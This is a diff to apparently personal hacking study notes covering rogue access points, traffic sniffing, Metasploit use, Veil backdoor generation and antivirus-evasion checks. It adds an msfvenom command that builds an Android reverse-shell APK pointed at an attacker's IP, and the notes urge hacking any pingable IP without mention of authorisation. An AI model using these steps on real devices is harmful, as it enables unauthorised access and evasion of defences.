@@ -141,12 +141,17 @@ If the user clicks on the "remember me" button a cookie is made in the browser. 
   * `bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
 ### Wireshark
 Use Wireshark to sniff the traffic of a network card. If tou are the MITM you can sniff the trafic of the target computet too.
+
 # Gaining Access
+
 ## Server Side Attacks
+
 Don't require user interaction. All is needed is the target IP.
 If you can ping the IP, go and hack it.
+
 ### Information Gathering
 Scan the IP with Zenmap.
+
 ### Metasploit
 Metasploit is an exploit development and execution tool.
 
@@ -170,6 +175,7 @@ Payloads are small pieces of code that will be executed on the target computer o
   * `set [option] [value]`
 * Run the current task
   * `exploit`
+
 ### Metasploit Community (MSFC)
 Metasploit community is a GUI that can discover open ports and installed 
 services on the target machine, not only that but it maps these services 
@@ -220,7 +226,7 @@ A backdoor is a file that gives full access over the machine that it gets execut
 
 [Click here](https://github.com/Veil-Framework/Veil) and clone it.
 
-#### Generate the backdoor
+#### Generate a backdoor for Windows
 * Got to the Veil directory and set up the program
   * `./config/setup.sh --force --silent`
 * Start the program
@@ -242,6 +248,10 @@ A backdoor is a file that gives full access over the machine that it gets execut
 
 Check if your backdoor is being detected by anti-virus by going to
 [No Distribute](https://nodistribute.com/) and upload your file.
+
+#### Generate a backdoor for Android
+
+`msfvenom -p android/meterpreter/[payload type(reverse_https)] LHOST=[attacker's IP] LPORT=[port] -o [file name.apk]`
 
 ### Listen for incomming connections
 
